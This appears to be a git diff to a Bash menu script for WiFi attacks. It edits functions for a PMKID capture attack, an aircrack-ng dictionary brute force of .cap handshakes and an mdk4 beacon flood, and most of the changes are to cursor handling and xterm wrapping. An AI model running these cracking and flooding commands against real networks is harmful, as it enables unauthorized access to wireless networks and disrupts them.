@@ -328,9 +328,9 @@ exitresart() {
 
 #[2] Attack with hcxtools and hashcat
 pkmid_ataque() {
-	clear
+	clear; tput civis
 	echo -e "\n${greenColour}[*]$grayColour Starting PMKID attack...\n"
-	sleep 1 
+	sleep 1; tput cnorm
 	echo -e "${blueColour}[!]$grayColour Recommendation: 600 seconds (10 minutes)"
 	echo -ne "$purpleColour[?]$grayColour How many seconds do you want the packet capture to last?: " && read seg
 	$cleancolor
@@ -358,14 +358,15 @@ pkmid_ataque() {
 }
 #[7] force brute with aircrack for files or hashes .cap
 fuerza_.cap() {
-	clear; echo -e "\n${greenColour}[*]$grayColour Starting Force Brute"
+	tput civis; clear; echo -e "\n${greenColour}[*]$grayColour Starting Force Brute"
 	sleep 1
 	echo -e "\n${yellowColour}[*]$grayColour Path to rockyou.txt: /usr/share/wordlists/rockyou.txt"
 	$cleancolor
 	tput cnorm
 	echo -ne "${blueColour}[?]$grayColour File path .cap: " && read cap
-	tput civis; echo -ne "${redColour}[?]$grayColour Dictionary path to use: " && read dicc
-	xterm -hold -e "aircrack-ng -w $dicc $cap"
+	echo -ne "${redColour}[?]$grayColour Dictionary path to use: " && read dicc
+	aircrack-ng -w $dicc $cap
+	echo -ne "${redColour}[!]$grayColour Enter to exit" && read
 }
 #force brute with dictionary precomputed
 fuerza_rainbow() {
@@ -557,14 +558,8 @@ dosattack() {
 #[4] Beacon flood attack with mdk
 beaconflood() {
 	tput civis; clear; echo -e "\n${purpleColour}[*]$grayColour Starting Beacon Flood attack..."; sleep 2
-	tput cnorm; echo -ne "\n${blueColour}[?]$grayColour You Want to name the networks (Recommend (N))? [Y/N]: " && read rpsbeacon 
-	if [ "$rpsbeacon" == "y" ] || [ "$rpsbeacon" == "Y" ]; then
-		echo -ne "${yelloColour}[?]$grayColour Name: " && read nameap
-			xterm -hold -e "sudo mdk4 $tar b -n $nameap -s 1000"
-	elif [ "$rpsbeacon" == "n" ] || [ "$rpsbeacon" == "N" ]; then
-		xterm -hold -e "sudo mdk4 $tar b -s 1000"
-	fi
-	
+	sudo mdk4 $tar b -s 1000
+
 }
 #[5] Network traffic with tcpdump
 traffic() {
